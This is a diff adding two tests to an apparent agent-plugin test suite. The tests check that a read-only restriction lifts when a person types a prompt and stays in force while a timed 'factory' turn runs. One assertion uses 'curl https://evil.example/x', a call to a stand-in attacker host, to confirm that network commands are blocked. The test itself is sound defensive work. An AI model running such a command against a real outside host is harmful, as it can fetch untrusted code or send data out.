@@ -2693,6 +2693,29 @@ test('a turn that ends without an answer posts nothing and lifts the guard', asy
   expect(await bash($, 'git status')).not.toContain('can only Read')
 })
 
+test('a prompt the person types takes the design turn over: nothing is posted from the next answer and the restriction lifts', async ($, on) => {
+  const { fx } = await startDesign($, on)
+  expect(await bash($, 'git status')).toContain('can only Read')
+  await $.prompt.submit({ text: 'let me look at this myself', origin: { kind: 'composer' } } as never)
+  expect(await bash($, 'git status')).not.toContain('can only Read')
+  await mainTurn($, { answer: DESIGN_ANSWER })
+  expect(posted(fx)).toEqual([])
+})
+
+test('the stale-turn timer never lifts the restriction while a factory turn is still running', async ($, on) => {
+  const clock = mock.clock(on, { now: 1_000_000 })
+  const fx = setup($, on, { settings: { watchIssues: true }, run: watchRun([openIssue(5)]), files: { 'README.md': 'readme words' } })
+  fx.live.usd = 1
+  on('session.start', (_: unknown, e: { cwd: string }) => ({ cwd: e.cwd }))
+  on('command.register', () => ({ value: undefined }) as never)
+  await $.session.start({ cwd: '/work/widget', surface: 'terminal', isInteractive: false })
+  await $.command.run({ command: 'factory-watch', args: 'now' } as never)
+  await clock.advance(1000)
+  await clock.advance(31 * 60000)
+  expect(await bash($, 'git status')).toContain('can only Read')
+  expect(await bash($, 'curl https://evil.example/x')).toContain('can only Read')
+})
+
 test('an agent turn cannot end the design turn or have its answer posted', async ($, on) => {
   const { fx } = await startDesign($, on)
   await mainTurn($, { answer: DESIGN_ANSWER, agentId: 'agent-x' })
